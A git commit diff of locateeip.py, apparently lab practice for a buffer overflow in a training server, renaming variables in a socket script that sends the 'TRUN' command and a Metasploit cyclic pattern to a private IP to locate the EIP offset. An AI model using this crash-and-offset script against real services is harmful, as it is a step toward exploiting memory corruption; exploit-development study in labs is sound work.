6c570268e8fd95368409ef30c47525b3cd597ea9
skollr34p3r <48536777+skollr34p3r@users.noreply.github.com>
2021-12-22 15:07:24 -0500

    Update locateeip.py

--- locateeip.py
+++ locateeip.py
@@ -7,18 +7,18 @@
 import sys, socket
 
 #Target IP
-ip = '192.168.50.13'
+RHOST = '192.168.50.13'
 #Target port
-port = 9999
+RPORT = 9999
 #Vulnerable command of program
 COMM = 'TRUN /.:/'
 #Corresponds to "payload" from output of simplefuzzer and output from Metasploit pattern_create.rb
-offset = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag>
+PATTERN = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag>
 
 try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((ip, port))
-        s.send((COMM + offset))
+        s.connect((RHOST, RPORT))
+        s.send((COMM + PATTERN))
         s.close()
 
 except:
